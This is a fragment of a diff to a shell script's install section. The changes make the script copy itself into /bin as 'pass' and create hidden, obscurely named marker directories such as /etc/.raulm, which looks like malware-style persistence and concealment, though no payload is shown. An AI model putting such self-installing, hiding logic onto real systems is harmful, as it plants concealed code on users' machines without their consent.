@@ -2,13 +2,13 @@
 
 ###INSTALL###
 
-if [ -e "$0" ]; then
+if [ ! -e /bin/pass ]; then
     chmod go-rwx "$0"
     chmod u-w "$0"
     chmod u+x "$0"
 fi
 if [ ! -e /bin/pass ]; then
-    cp src/pass /bin
+    cp "$0" /bin
 fi
 if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm/.Ye ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
     mkdir /etc/.raulm
